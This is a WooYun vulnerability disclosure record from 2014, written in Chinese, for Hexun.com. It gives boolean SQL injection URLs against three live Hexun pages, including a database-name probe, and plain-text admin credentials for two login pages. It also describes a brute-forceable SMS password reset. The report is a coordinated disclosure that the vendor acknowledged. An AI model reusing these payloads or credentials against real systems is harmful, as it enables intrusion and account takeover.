{"id": 648, "wybug_id": "wooyun-2014-074634", "wybug_title": "和讯网SQL注入漏洞多处+弱口令+任意密码重置", "wybug_corp": "和讯网", "wybug_author": "nextdoor", "wybug_date": "2014-09-01 14:35", "wybug_open_date": "2014-10-16 14:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述： 和讯网sql注入漏洞多处+弱口令+任意密码重置 详细说明：  0x01 SQL三处第一处http://funds.money.hexun.com/fundsdata/compare/data22.aspx?s_id=2393&link_str=open&filter_str=&order_str=fld_sumvalue%20desc&start_date=2012-12-15start_date参数存在注入\nhttp://funds.money.hexun.com/fundsdata/compare/data22.aspx?s_id=2393&link_str=open&filter_str=&order_str=fld_sumvalue%20desc&start_date=2012-12-15'%20and%20'1'='1 //返回正确http://funds.money.hexun.com/fundsdata/compare/data22.aspx?s_id=2393&link_str=open&filter_str=&order_str=fld_sumvalue%20desc&start_date=2012-12-15'%20and%20'2'='1 // 返回错误http://funds.money.hexun.com/fundsdata/compare/data22.aspx?s_id=2393&link_str=open&filter_str=&order_str=fld_sumvalue%20desc&start_date=2012-12-15'%20and%20SUBSTRING(DB_NAME(),1,1)='d'%20and%20'1'='1 //返回正确http://funds.money.hexun.com/fundsdata/compare/data22.aspx?s_id=2393&link_str=open&filter_str=&order_str=fld_sumvalue%20desc&start_date=2012-12-15'%20and%20SUBSTRING(DB_NAME(),1,7)='db_info'%20and%20'1'='1 //数据库为db_info\n第二处http://stockdata.stock.hexun.com/2008/sdgd.aspx?stockid=600053&accountdate=2004-12-31stockid和accountdate参数存在注入\nhttp://stockdata.stock.hexun.com/2008/sdgd.aspx?stockid=600053'%2and 1=1 and%20'1'='1&accountdate=2004-12-31 //返回正确http://stockdata.stock.hexun.com/2008/sdgd.aspx?stockid=600053'%20and 1=2 %20'2'='1&accountdate=2004-12-31 //返回错误http://stockdata.stock.hexun.com/2008/sdgd.aspx?stockid=600053'%20and%20%201=1%20and%20'1'='1&accountdate=2004-12-31 //返回正确http://stockdata.stock.hexun.com/2008/sdgd.aspx?stockid=600053'%20and%20%201=2%20and%20'1'='1&accountdate=2004-12-31 //返回错误\n第三处http://data.stock.hexun.com/hxclub/Ranking/zyywsr.aspx?date=2011-06-30&tag=desc&sort=2date参数\nhttp://data.stock.hexun.com/hxclub/Ranking/zyywsr.aspx?date=2011-06-30'%20and%201=1%20and%20'1'='1&tag=desc&sort=2 //返回正确http://data.stock.hexun.com/hxclub/Ranking/zyywsr.aspx?date=2011-06-30'%20and%201=2%20and%20'1'='1&tag=desc&sort=2 //返回错误\n0x02弱口令两处\nhttp://testwap.hexun.com/admin/index.jsp用户名admin  密码111111http://315.stock.hexun.com/login.action#用户名hrstock密码hrstock2012\n\n\n\n\n0x03 任意用户密码重置https://reg.hexun.com/getpassword.aspx当找回密码时，会给手机发送5位的验证码，没有次数限制，可以fuzzing\n\n\n\n\n\n\n\n得到验证码，可以重置任意用户   漏洞证明：  已证明   修复方案：  1.过滤验证2.更改用户名密码3.限制验证次数一起提交了，能走个前台不   版权声明：转载请注明来源 nextdoor@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-01 14:51 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}